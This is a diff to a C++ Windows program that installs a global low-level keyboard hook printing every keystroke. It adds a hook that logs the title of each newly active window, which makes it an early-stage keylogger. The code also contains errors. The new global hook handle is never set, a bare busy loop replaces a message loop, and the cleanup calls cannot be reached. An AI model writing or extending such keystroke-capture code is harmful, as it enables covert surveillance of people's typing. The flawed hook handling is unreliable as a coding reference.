@@ -45,6 +45,7 @@ int main()
 #include <ctime>
 
 
+HHOOK hook = NULL;
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
@@ -53,10 +54,32 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             std::cout << "Hit with key" << key << "\n";
         }
     }
-    return CallNextHookEx(NULL, nCode, wParam, lParam);
+    return CallNextHookEx(hook, nCode, wParam, lParam);
 }
 
+void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
+    LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
+{
+    if (event == EVENT_SYSTEM_FOREGROUND && hwnd != NULL) {
+        char windowTitle[256];
+        GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
+        std::cout << "Active Window Changed: " << windowTitle << "\n";
+    }
+}
+
+
 int main() {
+
+    HWINEVENTHOOK windowHook = SetWinEventHook(
+        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
+        nullptr, WinEventProc, 0, 0,
+        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS
+    );
+
+    if (!windowHook) {
+        std::cerr << "Failed to install hook." << std::endl;
+        return 1;
+    }
 
     HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     if (hHook == NULL) {
@@ -71,6 +94,7 @@ int main() {
     }
     while(true) {}
 
+    UnhookWinEvent(windowHook);
     UnhookWindowsHookEx(hHook);
 
     return 0;
